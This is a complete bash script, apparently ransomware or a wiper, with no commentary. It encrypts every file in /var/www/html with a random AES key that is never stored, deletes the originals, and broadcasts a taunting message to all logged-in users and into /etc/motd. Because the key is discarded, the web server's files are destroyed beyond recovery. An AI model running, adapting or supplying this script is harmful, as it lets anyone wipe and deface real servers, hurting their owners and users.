#!/bin/bash

iv=$(cat /dev/urandom | tr -cd 'A-F0-9' | head -c 32)
pass=$(cat /dev/urandom | tr -cd 'A-F0-9' | head -c 10)

dirwalk=/var/www/html

for f in "$dirwalk"/*; do
    if [[ -f "$f" ]]; then
        outfile="$f.encr"
        openssl enc -aes-256-cbc -a -salt -in "$f" -out "$outfile" -pass pass:$pass -iv $iv
        rm "$f"
    fi
done

echo "Giena goes BARK! Giena goes BARK! Giena goes BARK!" | wall
echo "Giena goes BARK! Giena goes BARK! Giena goes BARK!" > /etc/motd

exit 0

